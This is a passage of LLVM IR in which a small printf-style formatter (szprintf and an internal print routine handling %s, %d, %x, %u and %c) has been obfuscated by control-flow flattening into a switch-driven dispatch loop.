  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 1285708905, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -1210218798, i32 641673991
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 475386162, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 475386162, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1371405598, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i64*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1371405598, label %12
    i32 1893783354, label %18
    i32 -1426016050, label %24
    i32 1010367035, label %32
    i32 -1752348167, label %33
    i32 -1639851352, label %39
    i32 624046168, label %40
    i32 1690863889, label %46
    i32 1631305592, label %49
    i32 -488723359, label %50
    i32 -486233428, label %56
    i32 -913692314, label %61
    i32 -1405724199, label %62
    i32 -295017207, label %68
    i32 -1783152815, label %73
    i32 1272286174, label %75
    i32 -771974780, label %84
    i32 1732029431, label %87
    i32 -1991630746, label %93
    i32 -1555149318, label %99
    i32 -1467990917, label %105
    i32 -1650833015, label %110
    i32 -6075008, label %117
    i32 -1823239554, label %119
    i32 -757775152, label %120
    i32 2047337075, label %126
    i32 1748542737, label %132
    i32 1740586753, label %139
    i32 -13296022, label %145
    i32 1398368407, label %150
    i32 -200007238, label %157
    i32 -146053645, label %163
    i32 -709556576, label %170
    i32 2018376315, label %176
    i32 -1781956664, label %181
    i32 1524790503, label %188
    i32 -1741775776, label %194
    i32 547339988, label %201
    i32 980627493, label %207
    i32 -1582379622, label %212
    i32 -1755702290, label %219
    i32 -1817331650, label %225
    i32 637045823, label %232
    i32 -1189397841, label %238
    i32 -208538925, label %243
    i32 -1685722815, label %250
    i32 37600198, label %256
    i32 292343198, label %262
    i32 1376571411, label %268
    i32 -1073556373, label %273
    i32 -1184316915, label %285
    i32 29349985, label %286
    i32 -147182721, label %287
    i32 -955035041, label %294
    i32 732970245, label %295
    i32 -1102487569, label %298
    i32 -36281656, label %302
    i32 667651385, label %305
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 1893783354, i32 -1102487569
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1426016050, i32 29349985
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1010367035, i32 -1752348167
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1102487569, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1639851352, i32 624046168
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -147182721, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1690863889, i32 1631305592
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 1631305592, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -488723359, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -486233428, i32 -913692314
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -488723359, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1405724199, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -295017207, i32 -1783152815
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -1783152815, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 1272286174, i32 1732029431
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -771974780, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1405724199, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1991630746, i32 2047337075
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1555149318, i32 -1467990917
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i64*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1650833015, i32* %switchVar
  store i64* %103, i64** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i64*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1650833015, i32* %switchVar
  store i64* %108, i64** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i64*, i64** %.reg2mem78
  %111 = load i64, i64* %.reload79, align 8
  %112 = inttoptr i64 %111 to i8*
  store i8* %112, i8** %11, align 8
  %113 = load i8**, i8*** %4, align 8
  store i8** %113, i8*** %.reg2mem11
  %114 = load i8*, i8** %11, align 8
  %115 = icmp ne i8* %114, null
  %116 = select i1 %115, i32 -6075008, i32 -1823239554
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %11, align 8
  store i32 -757775152, i32* %switchVar
  store i8* %118, i8** %.reg2mem80
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -757775152, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %121 = load i32, i32* %7, align 4
  %122 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %123 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %121, i32 %122)
  %124 = load i32, i32* %9, align 4
  %125 = add nsw i32 %124, %123
  store i32 %125, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %5, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 100
  %131 = select i1 %130, i32 1748542737, i32 -200007238
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  store i8** %133, i8*** %.reg2mem13
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %134, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %135, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %136 = load i32, i32* %.reload21, align 8
  store i32 %136, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %137 = icmp ule i32 %.reload25, 40
  %138 = select i1 %137, i32 1740586753, i32 -13296022
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %141 = load i8*, i8** %140, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %142 = getelementptr i8, i8* %141, i32 %.reload24
  %143 = bitcast i8* %142 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %144 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %144, i32* %.reload20, align 8
  store i32 1398368407, i32* %switchVar
  store i32* %143, i32** %.reg2mem82
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to i32*
  %149 = getelementptr i8, i8* %147, i32 8
  store i8* %149, i8** %146, align 8
  store i32 1398368407, i32* %switchVar
  store i32* %148, i32** %.reg2mem82
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %151 = load i32, i32* %.reload83, align 4
  %152 = load i32, i32* %7, align 4
  %153 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %154 = call i32 @printi(i8** %.reload14, i32 %151, i32 10, i32 1, i32 %152, i32 %153, i32 97)
  %155 = load i32, i32* %9, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %5, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 120
  %162 = select i1 %161, i32 -146053645, i32 1524790503
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8**, i8*** %4, align 8
  store i8** %164, i8*** %.reg2mem26
  %165 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %165, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %166, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %167 = load i32, i32* %.reload34, align 8
  store i32 %167, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %168 = icmp ule i32 %.reload38, 40
  %169 = select i1 %168, i32 -709556576, i32 2018376315
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %173 = getelementptr i8, i8* %172, i32 %.reload37
  %174 = bitcast i8* %173 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %175 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %175, i32* %.reload33, align 8
  store i32 -1781956664, i32* %switchVar
  store i32* %174, i32** %.reg2mem84
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i32*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  store i32 -1781956664, i32* %switchVar
  store i32* %179, i32** %.reg2mem84
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %182 = load i32, i32* %.reload85, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %185 = call i32 @printi(i8** %.reload27, i32 %182, i32 16, i32 0, i32 %183, i32 %184, i32 97)
  %186 = load i32, i32* %9, align 4
  %187 = add nsw i32 %186, %185
  store i32 %187, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %5, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 88
  %193 = select i1 %192, i32 -1741775776, i32 -1755702290
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8**, i8*** %4, align 8
  store i8** %195, i8*** %.reg2mem39
  %196 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %196, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %197, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %198 = load i32, i32* %.reload47, align 8
  store i32 %198, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %199 = icmp ule i32 %.reload51, 40
  %200 = select i1 %199, i32 547339988, i32 980627493
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %202 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %203 = load i8*, i8** %202, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %204 = getelementptr i8, i8* %203, i32 %.reload50
  %205 = bitcast i8* %204 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %206 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %206, i32* %.reload46, align 8
  store i32 -1582379622, i32* %switchVar
  store i32* %205, i32** %.reg2mem86
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %208 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %209 = load i8*, i8** %208, align 8
  %210 = bitcast i8* %209 to i32*
  %211 = getelementptr i8, i8* %209, i32 8
  store i8* %211, i8** %208, align 8
  store i32 -1582379622, i32* %switchVar
  store i32* %210, i32** %.reg2mem86
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %213 = load i32, i32* %.reload87, align 4
  %214 = load i32, i32* %7, align 4
  %215 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %216 = call i32 @printi(i8** %.reload40, i32 %213, i32 16, i32 0, i32 %214, i32 %215, i32 65)
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, %216
  store i32 %218, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 117
  %224 = select i1 %223, i32 -1817331650, i32 -1685722815
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8**, i8*** %4, align 8
  store i8** %226, i8*** %.reg2mem52
  %227 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %227, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %228, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %229 = load i32, i32* %.reload60, align 8
  store i32 %229, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %230 = icmp ule i32 %.reload64, 40
  %231 = select i1 %230, i32 637045823, i32 -1189397841
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %234 = load i8*, i8** %233, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %235 = getelementptr i8, i8* %234, i32 %.reload63
  %236 = bitcast i8* %235 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %237 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %237, i32* %.reload59, align 8
  store i32 -208538925, i32* %switchVar
  store i32* %236, i32** %.reg2mem88
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  store i32 -208538925, i32* %switchVar
  store i32* %241, i32** %.reg2mem88
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %244 = load i32, i32* %.reload89, align 4
  %245 = load i32, i32* %7, align 4
  %246 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %247 = call i32 @printi(i8** %.reload53, i32 %244, i32 10, i32 0, i32 %245, i32 %246, i32 97)
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, %247
  store i32 %249, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %5, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 99
  %255 = select i1 %254, i32 37600198, i32 -1184316915
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %257, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %258 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %258, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %259 = load i32, i32* %.reload71, align 8
  store i32 %259, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %260 = icmp ule i32 %.reload75, 40
  %261 = select i1 %260, i32 292343198, i32 1376571411
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %264 = load i8*, i8** %263, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %265 = getelementptr i8, i8* %264, i32 %.reload74
  %266 = bitcast i8* %265 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %267 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %267, i32* %.reload70, align 8
  store i32 -1073556373, i32* %switchVar
  store i32* %266, i32** %.reg2mem90
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  store i32 -1073556373, i32* %switchVar
  store i32* %271, i32** %.reg2mem90
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %274 = load i32, i32* %.reload91, align 4
  %275 = trunc i32 %274 to i8
  %276 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %275, i8* %276, align 1
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %277, align 1
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @prints(i8** %278, i8* %279, i32 %280, i32 %281)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 -955035041, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 -147182721, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = load i8*, i8** %5, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  call void @printchar(i8** %288, i32 %291)
  %292 = load i32, i32* %9, align 4
  %293 = add nsw i32 %292, 1
  store i32 %293, i32* %9, align 4
  store i32 -955035041, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 732970245, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8*, i8** %5, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %5, align 8
  store i32 1371405598, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = icmp ne i8** %299, null
  %301 = select i1 %300, i32 -36281656, i32 667651385
  store i32 %301, i32* %switchVar
  br label %loopEnd

